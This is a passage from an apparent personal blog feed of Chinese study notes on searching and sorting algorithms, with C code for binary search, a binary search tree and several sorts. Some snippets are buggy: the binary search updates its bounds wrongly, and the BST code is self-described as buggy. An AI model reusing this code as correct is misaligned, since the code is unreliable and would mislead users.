class="hljs-keyword">if</span>(ints[mid]&gt;ints[high])&#123;<br>        <span class="hljs-type">int</span> tem=ints[mid];<br>        ints[mid]=ints[high];<br>        ints[high]=tem;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ints[low]&gt;ints[high])&#123;<br>        <span class="hljs-type">int</span> tem=ints[low];<br>        ints[low]=ints[high];<br>        ints[high]=tem;<br>    &#125;<br>   <br>    <span class="hljs-keyword">if</span>(ints[low]&lt;ints[mid])&#123;<br>        <span class="hljs-type">int</span> tem=ints[mid];<br>        ints[mid]=ints[low];<br>        ints[low]=tem;<br>    &#125;<br>    ints[<span class="hljs-number">0</span>]=ints[low];<br>   <br>   <br>    <span class="hljs-keyword">while</span>(low&lt;high)&#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[high]&gt;ints[<span class="hljs-number">0</span>])&#123;<br>            high--;<br>        &#125;<br>        ints[low]=ints[high];<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[low]&lt;ints[<span class="hljs-number">0</span>])&#123;<br>            low++;<br>        &#125;<br>        ints[high]=ints[low];<br>    &#125;<br>    ints[low]=ints[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span> &#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)&#123;<br>        <span class="hljs-type">int</span> midSub=findMidSub(ints,low,high);<br>   <br>        sort(ints,low,midSub<span class="hljs-number">-1</span>);<br>        sort(ints,midSub+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="基数排序（桶排序-x2F-箱排序）"><a href="#基数排序（桶排序-x2F-箱排序）" class="headerlink" title="基数排序（桶排序&#x2F;箱排序）"></a>基数排序（桶排序&#x2F;箱排序）</h2><ol><li>根据不同的关键词经行排序，所以桶排序适合于关键词的个数</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>algorithm</title>
    <link href="/2023/06/05/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/algorithm/"/>
    <url>/2023/06/05/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/algorithm/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><h2 id="顺序查找"><a href="#顺序查找" class="headerlink" title="顺序查找"></a>顺序查找</h2><ol><li><p>就是普通的查找方法    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">int</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> length,<span class="hljs-type">int</span> targetElement)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>        <span class="hljs-keyword">if</span>(targetElement==arr[i])&#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>   <br><span class="hljs-comment">//修改过后的代码</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">searchPlus</span><span class="hljs-params">(<span class="hljs-type">int</span> arr[],<span class="hljs-type">int</span> length,<span class="hljs-type">int</span> targetElement)</span>&#123;<br>    <span class="hljs-type">int</span> n=length<span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">while</span>(arr[n]!=targetElement&amp;&amp;n&gt;<span class="hljs-number">-1</span>)&#123;<br>        n--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="折中查找"><a href="#折中查找" class="headerlink" title="折中查找"></a>折中查找</h2><ol><li><p>折中查找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span> nums[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>&#125;;<br>    <span class="hljs-type">int</span> left=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> right=<span class="hljs-keyword">sizeof</span>(nums)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>)<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> mid=(left+right)/<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">while</span>(left&lt;=right)&#123;<br>        <span class="hljs-keyword">if</span>(nums[mid]&gt;<span class="hljs-number">6</span>)&#123;<br>            right=mid+<span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(nums[mid]&lt;<span class="hljs-number">6</span>) &#123;<br>            left=mid<span class="hljs-number">-1</span>;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;find it: %d&quot;</span>,nums[mid]);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        mid=(left+right)/<span class="hljs-number">2</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li><li><p>按比例查找（差值查找）</p><p>这个算法是根据这种算法来的，只是采用的比例不是<code>1/2</code> </p><p>这个算法可以用于大型的增长相对来说有序的线性表</p></li><li><p>斐波那契查找</p><p>根据的还是折半查找，只不过这个的表是斐波那契数列</p></li><li><p>线性索引查找</p><ul><li><p>索引方式</p><ul><li><p>稠密索引</p><p>适用于数据量不大</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95.png"></p></li><li><p>分块索引</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E7%A8%A0%E5%AF%86%E7%B4%A2%E5%BC%95.png"></p></li><li><p>倒排索引</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E5%80%92%E6%8E%92%E7%B4%A2%E5%BC%95.png"></p></li></ul></li></ul></li></ol><h2 id="二叉排序树（二叉查找树）、"><a href="#二叉排序树（二叉查找树）、" class="headerlink" title="二叉排序树（二叉查找树）、"></a>二叉排序树（二叉查找树）、</h2><p>没有学会</p><p>下面代码有bug</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;math.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> size 9</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">pLeft</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">pRight</span>;</span><br>    <span class="hljs-type">int</span> value;<br>&#125; Node, *pNode;<br><br><span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> nums[size] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertNode</span><span class="hljs-params">(pNode *pRoot, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*pRoot == <span class="hljs-literal">NULL</span>) &#123;<br>        *pRoot = (pNode) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        (*pRoot)-&gt;value = nums[sub];<br>        (*pRoot)-&gt;pLeft = <span class="hljs-literal">NULL</span>;<br>        (*pRoot)-&gt;pRight = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;value &gt; nums[sub]) &#123;<br>        insertNode(&amp;(*pRoot)-&gt;pLeft, val);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((*pRoot)-&gt;value &lt; nums[sub]) &#123;<br>        insertNode(&amp;(*pRoot)-&gt;pRight, val);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        sub++;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createTree</span><span class="hljs-params">(pNode *pRoot)</span> &#123;<br>    <span class="hljs-keyword">for</span> (; sub &lt; size; sub++) &#123;<br>        insertNode(pRoot, nums[sub]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destroyTree</span><span class="hljs-params">(pNode *pRoot)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;pLeft != <span class="hljs-literal">NULL</span>) &#123;<br>        destroyTree(&amp;(*pRoot)-&gt;pLeft);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  %d  &quot;</span>, (*pRoot)-&gt;value);<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;pRight != <span class="hljs-literal">NULL</span>) &#123;<br>        destroyTree(&amp;(*pRoot)-&gt;pRight);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(*pRoot);<br>&#125;<br><br><span class="hljs-comment">//查找二叉树的元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">SearchBSF</span><span class="hljs-params">(pNode *root, pNode *value, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain:查找二叉树</span><br><span class="hljs-comment">     * return:value,如果存在，就返回此节点的地址，否则返回上一个节点的地址</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//如果发现了值，就直接返回</span><br>    <span class="hljs-keyword">if</span> ((*root)-&gt;value &gt;= val) &#123;<br>        *value = *root;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;value == val) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;pLeft != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> i = SearchBSF(&amp;(*root)-&gt;pLeft, value, val);<br>        <span class="hljs-comment">//如果不写if,可能会出现后面还没有遍历，前面就已经退出</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;pRight != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> i = SearchBSF(&amp;(*root)-&gt;pRight, value, val);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//插入操作</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InsertBST</span><span class="hljs-params">(pNode *root, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain: 对二叉树排序树进行插入操作</span><br><span class="hljs-comment">     */</span><br>    pNode value = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (!SearchBSF(root, &amp;value, val)) &#123;<br>        pNode tem = (pNode) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        <span class="hljs-keyword">if</span>(tem==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        tem-&gt;value = val;<br>        tem-&gt;pRight = <span class="hljs-literal">NULL</span>;<br>        tem-&gt;pLeft = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-keyword">if</span> (value-&gt;value &gt; val) &#123;<br>            tem-&gt;pLeft = value-&gt;pLeft;<br>            value-&gt;pLeft = tem;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value-&gt;value &lt; val) &#123;<br>            tem-&gt;pRight=value-&gt;pRight;<br>            value-&gt;pRight=tem;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;insert error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(pNode* p)</span>&#123;<br>    pNode q,s;<br>    <span class="hljs-keyword">if</span>((*p)-&gt;pRight==<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        (*p)=(*p)-&gt;pRight;<br>        <span class="hljs-built_in">free</span>(q);<br>        q=<span class="hljs-literal">NULL</span>;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*p)-&gt;pLeft!=<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        (*p)=(*p)-&gt;pLeft;<br>        <span class="hljs-built_in">free</span>(q);<br>        q=<span class="hljs-literal">NULL</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        q=*p;<br>        s=q-&gt;pRight;<br>        <span class="hljs-keyword">while</span>(s!=<span class="hljs-literal">NULL</span>)&#123;<br>            q=s;<br>            s=s-&gt;pRight;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(q==*p)&#123;<br>            q=s;<br>            s=s-&gt;pLeft;<br>            (*p)-&gt;value=q-&gt;value;<br>            <span class="hljs-built_in">free</span>(q);<br>            q=<span class="hljs-literal">NULL</span>;<br>            (*p)-&gt;pLeft=s;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            (*p)-&gt;value=s-&gt;value;<br>            q-&gt;pRight=s-&gt;pLeft;<br>            <span class="hljs-built_in">free</span>(s);<br>            s=<span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//删除节点</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">deleteBST</span><span class="hljs-params">(pNode* root,<span class="hljs-type">int</span> val)</span>&#123;<br>    pNode tem;<br>    <span class="hljs-keyword">if</span>(*root==<span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t have tree&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span>(SearchBSF(root,&amp;tem,val))&#123;<br>            <span class="hljs-keyword">return</span> delete(&amp;tem);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    pNode root = <span class="hljs-literal">NULL</span>;<br>    pNode valueTem = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nums[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input value: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;value);<br>    createTree(&amp;root);<br>    <span class="hljs-keyword">if</span> (SearchBSF(&amp;root, &amp;valueTem, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hava value %d\n&quot;</span>, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t hava value\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value node is:%d\n&quot;</span>, valueTem-&gt;value);<br>    InsertBST(&amp;root,value);<br>    <span class="hljs-keyword">if</span> (SearchBSF(&amp;root, &amp;valueTem, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hava value %d\n&quot;</span>, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t hava value\n&quot;</span>);<br>    &#125;<br>    deleteBST(&amp;root,value);<br>    destroyTree(&amp;root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="平衡二叉排序树-AVL树"><a href="#平衡二叉排序树-AVL树" class="headerlink" title="平衡二叉排序树(AVL树)"></a>平衡二叉排序树(AVL树)</h2><ol><li><p>定义</p><p>左右子树的高度之差的绝对值小于等于1 </p><p>左右子树是一个平衡二叉排序树    </p></li><li><p>平衡因子</p><p>左右子树的高度差(左子树-右子树)</p><p><code>-1</code>,<code>1</code>,<code>0</code></p></li><li><p>调整平衡二叉树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E8%B0%83%E6%95%B4%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.jpg"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/LL%E5%9E%8B.png"></p></li></ol><h2 id="散列表（hash）"><a href="#散列表（hash）" class="headerlink" title="散列表（hash）"></a>散列表（hash）</h2><ol><li><p>定义</p><p>记录储存位置，与关键字的之间的对应关系</p></li><li><p>散列方法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E6%96%B9%E6%B3%95.png"></p></li><li><p>冲突</p><p>不同的关键码通过散列方法映射到同一个位置  </p></li><li><p>同义词</p><p>具有相同地址的关键字</p></li><li><p>构造散列函数</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E6%9E%84%E9%80%A0.png"></p></li><li><p>处理冲突</p><ul><li><p>开放地址法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E5%BC%80%E6%94%BE%E5%9C%B0%E5%9D%80fa.png"></p></li><li><p>链地址法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E9%93%BE%E5%9C%B0%E5%9D%80%E6%B3%95.png"></p></li></ul></li><li><p>散列表的查找</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E8%A1%A8%E7%9A%84%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95.png"></p></li></ol><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><ol><li><p>普通版</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; size-i; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(ints[j<span class="hljs-number">-1</span>]&lt;ints[j])&#123;<br>                <span class="hljs-type">int</span> tem=ints[j<span class="hljs-number">-1</span>];<br>                ints[j<span class="hljs-number">-1</span>]=ints[j];<br>                ints[j]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>根据需要限定范围</p></li></ol><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i+<span class="hljs-number">1</span>; j &lt; size; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(ints[i]&gt;ints[j])&#123;<br>                <span class="hljs-type">int</span> tem=ints[i];<br>                ints[i]=ints[j];<br>                ints[j]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h2><ol><li><p>对一个有序表插入一个数据</p></li><li><p>对一个无序的线表排序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (ints[i] &lt; ints[i - <span class="hljs-number">1</span>]) &#123;<br>            <span class="hljs-type">int</span> tem=ints[i];<br>            <span class="hljs-type">int</span> j=i<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">for</span> (; ints[j] &gt; tem; --j) &#123;<br>                ints[j+<span class="hljs-number">1</span>]=ints[j];<br>            &#125;<br>            ints[j+<span class="hljs-number">1</span>]=tem;<br>        &#125;<br>    &#125;<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><ol><li><p>只是对插排分组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 